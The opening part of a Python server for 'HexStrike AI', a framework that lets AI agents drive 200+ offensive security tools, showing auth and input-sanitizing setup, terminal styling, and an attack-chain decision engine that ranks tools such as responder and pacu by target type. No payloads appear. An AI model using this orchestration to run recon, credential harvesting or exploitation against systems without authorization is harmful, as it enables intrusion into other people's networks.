#!/usr/bin/env python3
"""
HexStrike AI - Advanced Penetration Testing Framework Server

Enhanced with AI-Powered Intelligence & Automation
🚀 Bug Bounty | CTF | Red Team | Security Research

ENHANCEMENTS (v7.0):
✅ Scope Management — mandatory target validation before any tool execution
✅ Reporting Engine — HTML/PDF reports with severity charts and finding management
✅ Active Directory Module — BloodHound, Impacket, Certipy, Kerbrute, Coercer, Lsassy + workflows
✅ Web App Tools — Dalfox, jwt_tool, Ghauri, Commix, Corsy, CRLFuzz, nomore403, Smuggler, graphql-cop, Subzy, gau
✅ Network Discovery — Naabu, dnsx, tlsx, Uncover, asnmap, ShuffleDNS, Interactsh
✅ Secrets & SAST — TruffleHog, Gitleaks, Semgrep
✅ Mobile Security — Frida, Objection, Apktool, APKLeaks, JADX
✅ Cloud New — CloudBrute, S3Scanner, enumerate-iam
✅ Post-Exploitation — Ligolo-ng, Chisel
✅ Security hardening — sanitize_input(), API key auth, rate limiting, CORS control
✅ 200+ security tools total

Architecture: Two-script system (hexstrike_server.py + hexstrike_mcp.py)
Framework: FastMCP integration for AI agent communication
"""

import argparse
import json
import logging
import os
import subprocess
import sys
import traceback
import threading
import time
import hashlib
import pickle
import base64
import queue
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from typing import Dict, Any, Optional
from collections import OrderedDict
import shutil
import venv
import zipfile
from pathlib import Path
from flask import Flask, request, jsonify
import psutil
import signal
import requests
import re
import socket
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Set, Tuple
import asyncio
import aiohttp
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import selenium
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import mitmproxy
from mitmproxy import http as mitmhttp
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.options import Options as MitmOptions
import uuid
import ipaddress
import fnmatch
import sqlite3
try:
    from flask_limiter import Limiter
    from flask_limiter.util import get_remote_address
    FLASK_LIMITER_AVAILABLE = True
except ImportError:
    FLASK_LIMITER_AVAILABLE = False
try:
    from flask_cors import CORS
    FLASK_CORS_AVAILABLE = True
except ImportError:
    FLASK_CORS_AVAILABLE = False
try:
    from jinja2 import Environment, BaseLoader
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False
try:
    import weasyprint
    WEASYPRINT_AVAILABLE = True
except ImportError:
    WEASYPRINT_AVAILABLE = False
try:
    import markdown as md_lib
    MARKDOWN_AVAILABLE = True
except ImportError:
    MARKDOWN_AVAILABLE = False
from functools import wraps

# ============================================================================
# LOGGING CONFIGURATION (MUST BE FIRST)
# ============================================================================

# Configure logging with fallback for permission issues
try:
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler('hexstrike.log')
        ]
    )
except PermissionError:
    # Fallback to console-only logging if file creation fails
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(sys.stdout)
        ]
    )
logger = logging.getLogger(__name__)

# Flask app configuration
app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False

# API Configuration
API_PORT = int(os.environ.get('HEXSTRIKE_PORT', 8888))
API_HOST = os.environ.get('HEXSTRIKE_HOST', '127.0.0.1')

# ============================================================================
# SECURITY CONFIGURATION (v7.0)
# ============================================================================

# API Key authentication (optional — set HEXSTRIKE_API_KEY env var to enable)
HEXSTRIKE_API_KEY = os.environ.get('HEXSTRIKE_API_KEY', '')

# CORS configuration
CORS_ALLOWED_ORIGINS = os.environ.get('HEXSTRIKE_CORS_ORIGINS', 'http://127.0.0.1').split(',')
if FLASK_CORS_AVAILABLE:
    CORS(app, origins=CORS_ALLOWED_ORIGINS)

# Rate limiter (100 req/min default)
if FLASK_LIMITER_AVAILABLE:
    limiter = Limiter(
        app=app,
        key_func=get_remote_address,
        default_limits=["200 per minute", "2000 per hour"],
        storage_uri="memory://"
    )
else:
    limiter = None

# Input sanitization — max length + block shell metacharacters
_DANGEROUS_CHARS = re.compile(r'[;&|`$><\(\){}\\]')
_MAX_INPUT_LENGTH = 2048

def sanitize_input(value: str) -> str:
    """Sanitize user input: truncate and strip dangerous shell metacharacters."""
    if not isinstance(value, str):
        return str(value)[:_MAX_INPUT_LENGTH]
    value = value[:_MAX_INPUT_LENGTH]
    value = _DANGEROUS_CHARS.sub('', value)
    return value.strip()

def require_api_key(f):
    """Decorator: enforce API key if HEXSTRIKE_API_KEY env var is set."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if HEXSTRIKE_API_KEY:
            provided = request.headers.get('X-API-Key', '')
            if provided != HEXSTRIKE_API_KEY:
                return jsonify({"error": "Unauthorized — invalid or missing X-API-Key header"}), 401
        return f(*args, **kwargs)
    return decorated

# ============================================================================
# MODERN VISUAL ENGINE (v2.0 ENHANCEMENT)
# ============================================================================

class ModernVisualEngine:
    """Beautiful, modern output formatting with animations and colors"""

    # Enhanced color palette with reddish tones and better highlighting
    COLORS = {
        'MATRIX_GREEN': '\033[38;5;46m',
        'NEON_BLUE': '\033[38;5;51m',
        'ELECTRIC_PURPLE': '\033[38;5;129m',
        'CYBER_ORANGE': '\033[38;5;208m',
        'HACKER_RED': '\033[38;5;196m',
        'TERMINAL_GRAY': '\033[38;5;240m',
        'BRIGHT_WHITE': '\033[97m',
        'RESET': '\033[0m',
        'BOLD': '\033[1m',
        'DIM': '\033[2m',
        # New reddish tones and highlighting colors
        'BLOOD_RED': '\033[38;5;124m',
        'CRIMSON': '\033[38;5;160m',
        'DARK_RED': '\033[38;5;88m',
        'FIRE_RED': '\033[38;5;202m',
        'ROSE_RED': '\033[38;5;167m',
        'BURGUNDY': '\033[38;5;52m',
        'SCARLET': '\033[38;5;197m',
        'RUBY': '\033[38;5;161m',
    # Unified theme primary/secondary (used going forward instead of legacy blue/green accents)
    'PRIMARY_BORDER': '\033[38;5;160m',  # CRIMSON
    'ACCENT_LINE': '\033[38;5;196m',      # HACKER_RED
    'ACCENT_GRADIENT': '\033[38;5;124m',  # BLOOD_RED (for subtle alternation)
        # Highlighting colors
        'HIGHLIGHT_RED': '\033[48;5;196m\033[38;5;15m',  # Red background, white text
        'HIGHLIGHT_YELLOW': '\033[48;5;226m\033[38;5;16m',  # Yellow background, black text
        'HIGHLIGHT_GREEN': '\033[48;5;46m\033[38;5;16m',  # Green background, black text
        'HIGHLIGHT_BLUE': '\033[48;5;51m\033[38;5;16m',  # Blue background, black text
        'HIGHLIGHT_PURPLE': '\033[48;5;129m\033[38;5;15m',  # Purple background, white text
        # Status colors with reddish tones
        'SUCCESS': '\033[38;5;46m',  # Bright green
        'WARNING': '\033[38;5;208m',  # Orange
        'ERROR': '\033[38;5;196m',  # Bright red
        'CRITICAL': '\033[48;5;196m\033[38;5;15m\033[1m',  # Red background, white bold text
        'INFO': '\033[38;5;51m',  # Cyan
        'DEBUG': '\033[38;5;240m',  # Gray
        # Vulnerability severity colors
        'VULN_CRITICAL': '\033[48;5;124m\033[38;5;15m\033[1m',  # Dark red background
        'VULN_HIGH': '\033[38;5;196m\033[1m',  # Bright red bold
        'VULN_MEDIUM': '\033[38;5;208m\033[1m',  # Orange bold
        'VULN_LOW': '\033[38;5;226m',  # Yellow
        'VULN_INFO': '\033[38;5;51m',  # Cyan
        # Tool status colors
        'TOOL_RUNNING': '\033[38;5;46m\033[5m',  # Blinking green
        'TOOL_SUCCESS': '\033[38;5;46m\033[1m',  # Bold green
        'TOOL_FAILED': '\033[38;5;196m\033[1m',  # Bold red
        'TOOL_TIMEOUT': '\033[38;5;208m\033[1m',  # Bold orange
        'TOOL_RECOVERY': '\033[38;5;129m\033[1m',  # Bold purple
        # Progress and animation colors
        'PROGRESS_BAR': '\033[38;5;46m',  # Green
        'PROGRESS_EMPTY': '\033[38;5;240m',  # Gray
        'SPINNER': '\033[38;5;51m',  # Cyan
        'PULSE': '\033[38;5;196m\033[5m'  # Blinking red
    }

    # Progress animation styles
    PROGRESS_STYLES = {
        'dots': ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
        'bars': ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█'],
        'arrows': ['←', '↖', '↑', '↗', '→', '↘', '↓', '↙'],
        'pulse': ['●', '◐', '◑', '◒', '◓', '◔', '◕', '◖', '◗', '◘']
    }

    @staticmethod
    def create_banner() -> str:
        """Create the enhanced HexStrike banner"""
        # Build a blood-red themed border using primary/gradient alternation
        border_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
        accent = ModernVisualEngine.COLORS['ACCENT_LINE']
        gradient = ModernVisualEngine.COLORS['ACCENT_GRADIENT']
        RESET = ModernVisualEngine.COLORS['RESET']
        BOLD = ModernVisualEngine.COLORS['BOLD']
        title_block = f"{accent}{BOLD}"
        banner = f"""
{title_block}
██╗  ██╗███████╗██╗  ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
██║  ██║██╔════╝╚██╗██╔╝██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
███████║█████╗   ╚███╔╝ ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗
██╔══██║██╔══╝   ██╔██╗ ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝
██║  ██║███████╗██╔╝ ██╗███████║   ██║   ██║  ██║██║██║  ██╗███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
{RESET}
{border_color}┌─────────────────────────────────────────────────────────────────────┐
│  {ModernVisualEngine.COLORS['BRIGHT_WHITE']}🚀 HexStrike AI - Blood-Red Offensive Intelligence Core{border_color}        │
│  {accent}⚡ AI-Automated Recon | Exploitation | Analysis Pipeline{border_color}          │
│  {gradient}🎯 Bug Bounty | CTF | Red Team | Zero-Day Research{border_color}              │
└─────────────────────────────────────────────────────────────────────┘{RESET}

{ModernVisualEngine.COLORS['TERMINAL_GRAY']}[INFO] Server starting on {API_HOST}:{API_PORT}
[INFO] 150+ integrated modules | Adaptive AI decision engine active
[INFO] Blood-red theme engaged – unified offensive operations UI{RESET}
"""
        return banner

    @staticmethod
    def create_progress_bar(current: int, total: int, width: int = 50, tool: str = "") -> str:
        """Create a beautiful progress bar with cyberpunk styling"""
        if total == 0:
            percentage = 0
        else:
            percentage = min(100, (current / total) * 100)

        filled = int(width * percentage / 100)
        bar = '█' * filled + '░' * (width - filled)

        border = ModernVisualEngine.COLORS['PRIMARY_BORDER']
        fill_col = ModernVisualEngine.COLORS['ACCENT_LINE']
        return f"""
{border}┌─ {tool} ─{'─' * (width - len(tool) - 4)}┐
│ {fill_col}{bar}{border} │ {percentage:6.1f}%
└─{'─' * (width + 10)}┘{ModernVisualEngine.COLORS['RESET']}"""

    @staticmethod
    def render_progress_bar(progress: float, width: int = 40, style: str = 'cyber',
                          label: str = "", eta: float = 0, speed: str = "") -> str:
        """Render a beautiful progress bar with multiple styles"""

        # Clamp progress between 0 and 1
        progress = max(0.0, min(1.0, progress))

        # Calculate filled and empty portions
        filled_width = int(width * progress)
        empty_width = width - filled_width

        # Style-specific rendering
        if style == 'cyber':
            filled_char = '█'
            empty_char = '░'
            bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
            progress_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
        elif style == 'matrix':
            filled_char = '▓'
            empty_char = '▒'
            bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
            progress_color = ModernVisualEngine.COLORS['ACCENT_GRADIENT']
        elif style == 'neon':
            filled_char = '━'
            empty_char = '─'
            bar_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
            progress_color = ModernVisualEngine.COLORS['CYBER_ORANGE']
        else:  # default
            filled_char = '█'
            empty_char = '░'
            bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
            progress_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']

        # Build the progress bar
        filled_part = bar_color + filled_char * filled_width
        empty_part = ModernVisualEngine.COLORS['TERMINAL_GRAY'] + empty_char * empty_width
        percentage = f"{progress * 100:.1f}%"

        # Add ETA and speed if provided
        extra_info = ""
        if eta > 0:
            extra_info += f" ETA: {eta:.1f}s"
        if speed:
            extra_info += f" Speed: {speed}"

        # Build final progress bar
        bar_display = f"[{filled_part}{empty_part}{ModernVisualEngine.COLORS['RESET']}] {progress_color}{percentage}{ModernVisualEngine.COLORS['RESET']}"

        if label:
            return f"{label}: {bar_display}{extra_info}"
        else:
            return f"{bar_display}{extra_info}"

    @staticmethod
    def create_live_dashboard(processes: Dict[int, Dict[str, Any]]) -> str:
        """Create a live dashboard showing all active processes"""

        if not processes:
            return f"""
{ModernVisualEngine.COLORS['PRIMARY_BORDER']}╭─────────────────────────────────────────────────────────────────────────────╮
│ {ModernVisualEngine.COLORS['ACCENT_LINE']}📊 HEXSTRIKE LIVE DASHBOARD{ModernVisualEngine.COLORS['PRIMARY_BORDER']}                                           │
├─────────────────────────────────────────────────────────────────────────────┤
│ {ModernVisualEngine.COLORS['TERMINAL_GRAY']}No active processes currently running{ModernVisualEngine.COLORS['PRIMARY_BORDER']}                                    │
╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}
"""

        dashboard_lines = [
            f"{ModernVisualEngine.COLORS['PRIMARY_BORDER']}╭─────────────────────────────────────────────────────────────────────────────╮",
            f"│ {ModernVisualEngine.COLORS['ACCENT_LINE']}📊 HEXSTRIKE LIVE DASHBOARD{ModernVisualEngine.COLORS['PRIMARY_BORDER']}                                           │",
            f"├─────────────────────────────────────────────────────────────────────────────┤"
        ]

        for pid, proc_info in processes.items():
            status = proc_info.get('status', 'unknown')
            command = proc_info.get('command', 'unknown')[:50] + "..." if len(proc_info.get('command', '')) > 50 else proc_info.get('command', 'unknown')
            duration = proc_info.get('duration', 0)

            status_color = ModernVisualEngine.COLORS['ACCENT_LINE'] if status == 'running' else ModernVisualEngine.COLORS['HACKER_RED']

            dashboard_lines.append(
                f"│ {ModernVisualEngine.COLORS['CYBER_ORANGE']}PID {pid}{ModernVisualEngine.COLORS['PRIMARY_BORDER']} | {status_color}{status}{ModernVisualEngine.COLORS['PRIMARY_BORDER']} | {ModernVisualEngine.COLORS['BRIGHT_WHITE']}{command}{ModernVisualEngine.COLORS['PRIMARY_BORDER']} │"
            )

        dashboard_lines.append(f"╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}")

        return "\n".join(dashboard_lines)

    @staticmethod
    def format_vulnerability_card(vuln_data: Dict[str, Any]) -> str:
        """Format vulnerability as a beautiful card"""
        severity = vuln_data.get('severity', 'unknown').upper()
        name = vuln_data.get('name', 'Unknown Vulnerability')
        description = vuln_data.get('description', 'No description available')

        # Severity color mapping
        severity_colors = {
            'CRITICAL': ModernVisualEngine.COLORS['VULN_CRITICAL'],
            'HIGH': ModernVisualEngine.COLORS['HACKER_RED'],
            'MEDIUM': ModernVisualEngine.COLORS['ACCENT_GRADIENT'],
            'LOW': ModernVisualEngine.COLORS['CYBER_ORANGE'],
            'INFO': ModernVisualEngine.COLORS['TERMINAL_GRAY']
        }

        color = severity_colors.get(severity, ModernVisualEngine.COLORS['TERMINAL_GRAY'])

        return f"""
{color}┌─ 🚨 VULNERABILITY DETECTED ─────────────────────────────────────┐
│ {ModernVisualEngine.COLORS['BRIGHT_WHITE']}{name:<60}{color} │
│ {ModernVisualEngine.COLORS['TERMINAL_GRAY']}Severity: {color}{severity:<52}{color} │
│ {ModernVisualEngine.COLORS['TERMINAL_GRAY']}{description[:58]:<58}{color} │
└─────────────────────────────────────────────────────────────────┘{ModernVisualEngine.COLORS['RESET']}"""

    @staticmethod
    def format_error_card(error_type: str, tool_name: str, error_message: str, recovery_action: str = "") -> str:
        """Format error information as a highlighted card with reddish tones"""
        error_colors = {
            'CRITICAL': ModernVisualEngine.COLORS['VULN_CRITICAL'],
            'ERROR': ModernVisualEngine.COLORS['TOOL_FAILED'],
            'TIMEOUT': ModernVisualEngine.COLORS['TOOL_TIMEOUT'],
            'RECOVERY': ModernVisualEngine.COLORS['TOOL_RECOVERY'],
            'WARNING': ModernVisualEngine.COLORS['WARNING']
        }

        color = error_colors.get(error_type.upper(), ModernVisualEngine.COLORS['ERROR'])

        card = f"""
{color}┌─ 🔥 ERROR DETECTED ─────────────────────────────────────────────┐{ModernVisualEngine.COLORS['RESET']}
{color}│ {ModernVisualEngine.COLORS['BRIGHT_WHITE']}Tool: {tool_name:<55}{color} │{ModernVisualEngine.COLORS['RESET']}
{color}│ {ModernVisualEngine.COLORS['BRIGHT_WHITE']}Type: {error_type:<55}{color} │{ModernVisualEngine.COLORS['RESET']}
{color}│ {ModernVisualEngine.COLORS['BRIGHT_WHITE']}Error: {error_message[:53]:<53}{color} │{ModernVisualEngine.COLORS['RESET']}"""

        if recovery_action:
            card += f"""
{color}│ {ModernVisualEngine.COLORS['TOOL_RECOVERY']}Recovery: {recovery_action[:50]:<50}{color} │{ModernVisualEngine.COLORS['RESET']}"""

        card += f"""
{color}└─────────────────────────────────────────────────────────────────┘{ModernVisualEngine.COLORS['RESET']}"""

        return card

    @staticmethod
    def format_tool_status(tool_name: str, status: str, target: str = "", progress: float = 0.0) -> str:
        """Format tool execution status with enhanced highlighting"""
        status_colors = {
            'RUNNING': ModernVisualEngine.COLORS['TOOL_RUNNING'],
            'SUCCESS': ModernVisualEngine.COLORS['TOOL_SUCCESS'],
            'FAILED': ModernVisualEngine.COLORS['TOOL_FAILED'],
            'TIMEOUT': ModernVisualEngine.COLORS['TOOL_TIMEOUT'],
            'RECOVERY': ModernVisualEngine.COLORS['TOOL_RECOVERY']
        }

        color = status_colors.get(status.upper(), ModernVisualEngine.COLORS['INFO'])

        # Create progress bar if progress > 0
        progress_bar = ""
        if progress > 0:
            filled = int(20 * progress)
            empty = 20 - filled
            progress_bar = f" [{ModernVisualEngine.COLORS['PROGRESS_BAR']}{'█' * filled}{ModernVisualEngine.COLORS['PROGRESS_EMPTY']}{'░' * empty}{ModernVisualEngine.COLORS['RESET']}] {progress*100:.1f}%"

        return f"{color}🔧 {tool_name.upper()}{ModernVisualEngine.COLORS['RESET']} | {color}{status}{ModernVisualEngine.COLORS['RESET']} | {ModernVisualEngine.COLORS['BRIGHT_WHITE']}{target}{ModernVisualEngine.COLORS['RESET']}{progress_bar}"

    @staticmethod
    def format_highlighted_text(text: str, highlight_type: str = "RED") -> str:
        """Format text with highlighting background"""
        highlight_colors = {
            'RED': ModernVisualEngine.COLORS['HIGHLIGHT_RED'],
            'YELLOW': ModernVisualEngine.COLORS['HIGHLIGHT_YELLOW'],
            'GREEN': ModernVisualEngine.COLORS['HIGHLIGHT_GREEN'],
            'BLUE': ModernVisualEngine.COLORS['HIGHLIGHT_BLUE'],
            'PURPLE': ModernVisualEngine.COLORS['HIGHLIGHT_PURPLE']
        }

        color = highlight_colors.get(highlight_type.upper(), ModernVisualEngine.COLORS['HIGHLIGHT_RED'])
        return f"{color} {text} {ModernVisualEngine.COLORS['RESET']}"

    @staticmethod
    def format_vulnerability_severity(severity: str, count: int = 0) -> str:
        """Format vulnerability severity with appropriate colors"""
        severity_colors = {
            'CRITICAL': ModernVisualEngine.COLORS['VULN_CRITICAL'],
            'HIGH': ModernVisualEngine.COLORS['VULN_HIGH'],
            'MEDIUM': ModernVisualEngine.COLORS['VULN_MEDIUM'],
            'LOW': ModernVisualEngine.COLORS['VULN_LOW'],
            'INFO': ModernVisualEngine.COLORS['VULN_INFO']
        }

        color = severity_colors.get(severity.upper(), ModernVisualEngine.COLORS['INFO'])
        count_text = f" ({count})" if count > 0 else ""

        return f"{color}{severity.upper()}{count_text}{ModernVisualEngine.COLORS['RESET']}"

    @staticmethod
    def create_section_header(title: str, icon: str = "🔥", color: str = "FIRE_RED") -> str:
        """Create a section header with reddish styling"""
        header_color = ModernVisualEngine.COLORS.get(color, ModernVisualEngine.COLORS['FIRE_RED'])

        return f"""
{header_color}{'═' * 70}{ModernVisualEngine.COLORS['RESET']}
{header_color}{icon} {title.upper()}{ModernVisualEngine.COLORS['RESET']}
{header_color}{'═' * 70}{ModernVisualEngine.COLORS['RESET']}"""

    @staticmethod
    def format_command_execution(command: str, status: str, duration: float = 0.0) -> str:
        """Format command execution with enhanced styling"""
        status_colors = {
            'STARTING': ModernVisualEngine.COLORS['INFO'],
            'RUNNING': ModernVisualEngine.COLORS['TOOL_RUNNING'],
            'SUCCESS': ModernVisualEngine.COLORS['TOOL_SUCCESS'],
            'FAILED': ModernVisualEngine.COLORS['TOOL_FAILED'],
            'TIMEOUT': ModernVisualEngine.COLORS['TOOL_TIMEOUT']
        }

        color = status_colors.get(status.upper(), ModernVisualEngine.COLORS['INFO'])
        duration_text = f" ({duration:.2f}s)" if duration > 0 else ""

        return f"{color}▶ {command[:60]}{'...' if len(command) > 60 else ''} | {status.upper()}{duration_text}{ModernVisualEngine.COLORS['RESET']}"

# ============================================================================
# INTELLIGENT DECISION ENGINE (v6.0 ENHANCEMENT)
# ============================================================================

class TargetType(Enum):
    """Enumeration of different target types for intelligent analysis"""
    WEB_APPLICATION = "web_application"
    NETWORK_HOST = "network_host"
    API_ENDPOINT = "api_endpoint"
    CLOUD_SERVICE = "cloud_service"
    MOBILE_APP = "mobile_app"
    BINARY_FILE = "binary_file"
    UNKNOWN = "unknown"

class TechnologyStack(Enum):
    """Common technology stacks for targeted testing"""
    APACHE = "apache"
    NGINX = "nginx"
    IIS = "iis"
    NODEJS = "nodejs"
    PHP = "php"
    PYTHON = "python"
    JAVA = "java"
    DOTNET = "dotnet"
    WORDPRESS = "wordpress"
    DRUPAL = "drupal"
    JOOMLA = "joomla"
    REACT = "react"
    ANGULAR = "angular"
    VUE = "vue"
    UNKNOWN = "unknown"

@dataclass
class TargetProfile:
    """Comprehensive target analysis profile for intelligent decision making"""
    target: str
    target_type: TargetType = TargetType.UNKNOWN
    ip_addresses: List[str] = field(default_factory=list)
    open_ports: List[int] = field(default_factory=list)
    services: Dict[int, str] = field(default_factory=dict)
    technologies: List[TechnologyStack] = field(default_factory=list)
    cms_type: Optional[str] = None
    cloud_provider: Optional[str] = None
    security_headers: Dict[str, str] = field(default_factory=dict)
    ssl_info: Dict[str, Any] = field(default_factory=dict)
    subdomains: List[str] = field(default_factory=list)
    endpoints: List[str] = field(default_factory=list)
    attack_surface_score: float = 0.0
    risk_level: str = "unknown"
    confidence_score: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert TargetProfile to dictionary for JSON serialization"""
        return {
            "target": self.target,
            "target_type": self.target_type.value,
            "ip_addresses": self.ip_addresses,
            "open_ports": self.open_ports,
            "services": self.services,
            "technologies": [tech.value for tech in self.technologies],
            "cms_type": self.cms_type,
            "cloud_provider": self.cloud_provider,
            "security_headers": self.security_headers,
            "ssl_info": self.ssl_info,
            "subdomains": self.subdomains,
            "endpoints": self.endpoints,
            "attack_surface_score": self.attack_surface_score,
            "risk_level": self.risk_level,
            "confidence_score": self.confidence_score
        }

@dataclass
class AttackStep:
    """Individual step in an attack chain"""
    tool: str
    parameters: Dict[str, Any]
    expected_outcome: str
    success_probability: float
    execution_time_estimate: int  # seconds
    dependencies: List[str] = field(default_factory=list)

class AttackChain:
    """Represents a sequence of attacks for maximum impact"""
    def __init__(self, target_profile: TargetProfile):
        self.target_profile = target_profile
        self.steps: List[AttackStep] = []
        self.success_probability: float = 0.0
        self.estimated_time: int = 0
        self.required_tools: Set[str] = set()
        self.risk_level: str = "unknown"

    def add_step(self, step: AttackStep):
        """Add a step to the attack chain"""
        self.steps.append(step)
        self.required_tools.add(step.tool)
        self.estimated_time += step.execution_time_estimate

    def calculate_success_probability(self):
        """Calculate overall success probability of the attack chain"""
        if not self.steps:
            self.success_probability = 0.0
            return

        # Use compound probability for sequential steps
        prob = 1.0
        for step in self.steps:
            prob *= step.success_probability

        self.success_probability = prob

    def to_dict(self) -> Dict[str, Any]:
        """Convert AttackChain to dictionary"""
        return {
            "target": self.target_profile.target,
            "steps": [
                {
                    "tool": step.tool,
                    "parameters": step.parameters,
                    "expected_outcome": step.expected_outcome,
                    "success_probability": step.success_probability,
                    "execution_time_estimate": step.execution_time_estimate,
                    "dependencies": step.dependencies
                }
                for step in self.steps
            ],
            "success_probability": self.success_probability,
            "estimated_time": self.estimated_time,
            "required_tools": list(self.required_tools),
            "risk_level": self.risk_level
        }

class IntelligentDecisionEngine:
    """AI-powered tool selection and parameter optimization engine"""

    def __init__(self):
        self.tool_effectiveness = self._initialize_tool_effectiveness()
        self.technology_signatures = self._initialize_technology_signatures()
        self.attack_patterns = self._initialize_attack_patterns()
        self._use_advanced_optimizer = True  # Enable advanced optimization by default

    def _initialize_tool_effectiveness(self) -> Dict[str, Dict[str, float]]:
        """Initialize tool effectiveness ratings for different target types"""
        return {
            TargetType.WEB_APPLICATION.value: {
                "nmap": 0.8,
                "gobuster": 0.9,
                "nuclei": 0.95,
                "nikto": 0.85,
                "sqlmap": 0.9,
                "ffuf": 0.9,
                "feroxbuster": 0.85,
                "katana": 0.88,
                "httpx": 0.85,
                "wpscan": 0.95,  # High for WordPress sites
                "burpsuite": 0.9,
                "dirsearch": 0.87,
                "gau": 0.82,
                "waybackurls": 0.8,
                "arjun": 0.9,
                "paramspider": 0.85,
                "x8": 0.88,
                "jaeles": 0.92,
                "dalfox": 0.93,  # High for XSS detection
                "anew": 0.7,  # Utility tool
                "qsreplace": 0.75,  # Utility tool
                "uro": 0.7  # Utility tool
            },
            TargetType.NETWORK_HOST.value: {
                "nmap": 0.95,
                "nmap-advanced": 0.97,  # Enhanced Nmap with NSE scripts
                "masscan": 0.92,  # Enhanced with intelligent rate limiting
                "rustscan": 0.9,  # Ultra-fast scanning
                "autorecon": 0.95,  # Comprehensive automated recon
                "enum4linux": 0.8,
                "enum4linux-ng": 0.88,  # Enhanced version
                "smbmap": 0.85,
                "rpcclient": 0.82,
                "nbtscan": 0.75,
                "arp-scan": 0.85,  # Great for network discovery
                "responder": 0.88,  # Excellent for credential harvesting
                "hydra": 0.8,
                "netexec": 0.85,
                "amass": 0.7
            },
            TargetType.API_ENDPOINT.value: {
                "nuclei": 0.9,
                "ffuf": 0.85,
                "arjun": 0.95,  # Excellent for API parameter discovery
                "paramspider": 0.88,
                "httpx": 0.9,  # Great for API probing
                "x8": 0.92,  # Excellent for hidden parameters
                "katana": 0.85,  # Good for API endpoint discovery
                "jaeles": 0.88,
                "postman": 0.8
            },
            TargetType.CLOUD_SERVICE.value: {
                "prowler": 0.95,  # Excellent for AWS security assessment
                "scout-suite": 0.92,  # Great for multi-cloud assessment
                "cloudmapper": 0.88,  # Good for AWS network visualization
                "pacu": 0.85,  # AWS exploitation framework
                "trivy": 0.9,  # Excellent for container scanning
                "clair": 0.85,  # Good for container vulnerability analysis
                "kube-hunter": 0.9,  # Excellent for Kubernetes penetration testing
                "kube-bench": 0.88,  # Great for CIS benchmarks
                "docker-bench-security": 0.85,  # Good for Docker security
                "falco": 0.87,  # Great for runtime monitoring
                "checkov": 0.9,  # Excellent for IaC scanning
                "terrascan": 0.88  # Great for IaC security
            },
            TargetType.BINARY_FILE.value: {
                "ghidra": 0.95,  # Excellent for comprehensive analysis
                "radare2": 0.9,  # Great for reverse engineering
                "gdb": 0.85,
                "gdb-peda": 0.92,  # Enhanced debugging
                "angr": 0.88,  # Excellent for symbolic execution
                "pwntools": 0.9,  # Great for exploit development
                "ropgadget": 0.85,
                "ropper": 0.88,  # Enhanced gadget searching
                "one-gadget": 0.82,  # Specific to libc
                "libc-database": 0.8,  # Specific to libc identification
                "checksec": 0.75,
                "strings": 0.7,
                "objdump": 0.75,
                "binwalk": 0.8,
                "pwninit": 0.85  # Great for CTF setup
            }
        }

    def _initialize_technology_signatures(self) -> Dict[str, Dict[str, List[str]]]:
        """Initialize technology detection signatures"""
        return {
            "headers": {
                TechnologyStack.APACHE.value: ["Apache", "apache"],
                TechnologyStack.NGINX.value: ["nginx", "Nginx"],
                TechnologyStack.IIS.value: ["Microsoft-IIS", "IIS"],
                TechnologyStack.PHP.value: ["PHP", "X-Powered-By: PHP"],
                TechnologyStack.NODEJS.value: ["Express", "X-Powered-By: Express"],
                TechnologyStack.PYTHON.value: ["Django", "Flask", "Werkzeug"],
                TechnologyStack.JAVA.value: ["Tomcat", "JBoss", "WebLogic"],
                TechnologyStack.DOTNET.value: ["ASP.NET", "X-AspNet-Version"]
            },
            "content": {
                TechnologyStack.WORDPRESS.value: ["wp-content", "wp-includes", "WordPress"],
                TechnologyStack.DRUPAL.value: ["Drupal", "drupal", "/sites/default"],
                TechnologyStack.JOOMLA.value: ["Joomla", "joomla", "/administrator"],
                TechnologyStack.REACT.value: ["React", "react", "__REACT_DEVTOOLS"],
                TechnologyStack.ANGULAR.value: ["Angular", "angular", "ng-version"],
                TechnologyStack.VUE.value: ["Vue", "vue", "__VUE__"]
            },
            "ports": {
                TechnologyStack.APACHE.value: [80, 443, 8080, 8443],
                TechnologyStack.NGINX.value: [80, 443, 8080],
                TechnologyStack.IIS.value: [80, 443, 8080],
                TechnologyStack.NODEJS.value: [3000, 8000, 8080, 9000]
            }
        }

    def _initialize_attack_patterns(self) -> Dict[str, List[Dict[str, Any]]]:
        """Initialize common attack patterns for different scenarios"""
        return {
            "web_reconnaissance": [
